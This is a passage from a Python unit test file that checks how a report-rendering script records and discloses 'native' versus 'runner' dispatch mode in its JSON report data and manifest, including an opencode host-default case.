        # boundaries differ by EXACTLY the one native disclosure entry
        self.assertEqual(len(ndata["boundaries"]), len(pdata["boundaries"]) + 1)
        self.assertEqual(ndata["boundaries"][:-1], pdata["boundaries"])
        self.assertIn("派发形态为原生子代理波次派发", ndata["boundaries"][-1])
        self.assertNotEqual(pdata["meta"], ndata["meta"])
        self.assertEqual(set(ndata["meta"]) - set(pdata["meta"]), {"dispatch"})
        self.assertEqual(set(nmanifest) - set(pmanifest), {"dispatch"})


    # --- fix-mgh-sdr-native-default-dispatch 2.5: host-default disclosure ---
    def _render_mirror(self, repo, run_dir, **assets):
        sys.path.insert(0, str(HERE))
        from _sdr_install_mirror import build_opencode_mirror
        scripts = build_opencode_mirror(self.tmp / "mirror", **assets)
        p = subprocess.run([sys.executable,
                            str(scripts / "render_sdr_report.py"),
                            "--run-dir", str(run_dir), "--repo", str(repo)],
                           capture_output=True, text=True, encoding="utf-8")
        return p

    def test_opencode_host_default_discloses_without_profile(self):
        repo, run_dir = self._build(native=False)
        (run_dir / "native_plan.json").write_text("{}", encoding="utf-8")
        p = self._render_mirror(repo, run_dir)
        self.assertEqual(p.returncode, 0, p.stderr)
        data = json.loads((run_dir / "sdr_report_data.json").read_text(
            encoding="utf-8"))
        manifest = json.loads((run_dir / "sdr_manifest.json").read_text(
            encoding="utf-8"))
        d = data["meta"]["dispatch"]
        self.assertEqual(d["form"], "native")
        self.assertEqual(d["source"], "host-default")
        self.assertEqual(d["host_face"], "opencode")
        self.assertEqual(d["consumer"], "sdr")
        self.assertFalse(d["profile_exists"])
        self.assertIn("opencode host default", d["evidence"])
        self.assertEqual(manifest["dispatch"]["form"], "native")
        report = Path(json.loads(p.stdout)["report"]).read_text(encoding="utf-8")
        self.assertEqual(_embed(self.m, report)["meta"]["dispatch"]["form"],
                         "native")

    def test_opencode_no_plan_artifact_stays_silent(self):
        repo, run_dir = self._build(native=False)
        p = self._render_mirror(repo, run_dir)
        self.assertEqual(p.returncode, 0, p.stderr)
        data = json.loads((run_dir / "sdr_report_data.json").read_text(
            encoding="utf-8"))
        manifest = json.loads((run_dir / "sdr_manifest.json").read_text(
            encoding="utf-8"))
        self.assertNotIn("dispatch", data["meta"])
        self.assertNotIn("dispatch", manifest)

    def test_opencode_explicit_runner_stays_silent_with_plan(self):
        repo, run_dir = self._build(native=False)
        (run_dir / "native_plan.json").write_text("{}", encoding="utf-8")
        (repo / ".mgh").mkdir(parents=True, exist_ok=True)
        (repo / ".mgh" / "env-profile.json").write_text(json.dumps(
            {"v": 1, "dispatch_mode": "runner"}), encoding="utf-8")
        p = self._render_mirror(repo, run_dir)
        self.assertEqual(p.returncode, 0, p.stderr)
        data = json.loads((run_dir / "sdr_report_data.json").read_text(
            encoding="utf-8"))
        manifest = json.loads((run_dir / "sdr_manifest.json").read_text(
            encoding="utf-8"))
        self.assertNotIn("dispatch", data["meta"])
        self.assertNotIn("dispatch", manifest)


if __name__ == "__main__":
    unittest.main(verbosity=2)
